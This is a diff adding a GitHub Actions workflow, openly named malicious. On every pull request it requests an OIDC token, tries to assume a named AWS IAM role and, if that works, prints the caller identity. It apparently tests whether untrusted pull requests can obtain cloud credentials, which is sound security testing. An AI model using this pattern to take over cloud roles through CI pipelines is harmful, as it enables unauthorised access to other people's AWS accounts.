@@ -1,0 +1,34 @@
+name: Malicious PR Workflow
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  attack:
+    name: Attempting AWS Access from PR
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Announce malicious intent
+        run: |
+          echo "MALICIOUS WORKFLOW"
+
+      - name: Try to assume AWS role
+        uses: aws-actions/configure-aws-credentials@v4
+        continue-on-error: true
+        id: aws-auth
+        with:
+          role-to-assume: arn:aws:iam::851725637490:role/GithubActionsTest
+          aws-region: us-east-1
+
+
+      - name: Attempt to get caller identity
+        if: steps.aws-auth.outcome == 'success'
+        run: |
+          echo "Successfully authenticated as:"
+          aws sts get-caller-identity
